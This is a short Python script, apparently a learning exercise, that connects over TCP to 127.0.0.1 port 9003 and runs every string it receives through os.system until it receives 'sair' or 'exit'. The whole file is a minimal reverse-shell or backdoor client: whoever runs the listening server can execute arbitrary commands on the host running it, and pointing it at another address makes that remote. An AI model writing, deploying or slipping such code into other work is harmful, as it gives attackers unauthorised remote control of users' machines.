import socket
import os

port = 9003
host = "127.0.0.1"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
    try:
        client.connect((host, port))

        while True:
            data_server = client.recv(2048).decode()
            if data_server == "sair" or data_server == "exit":
                client.close()
                break
            os.system(data_server)


    except socket.error as msg:
        print(msg)

    except Exception as ex:
        print(ex)

    finally:
        client.close()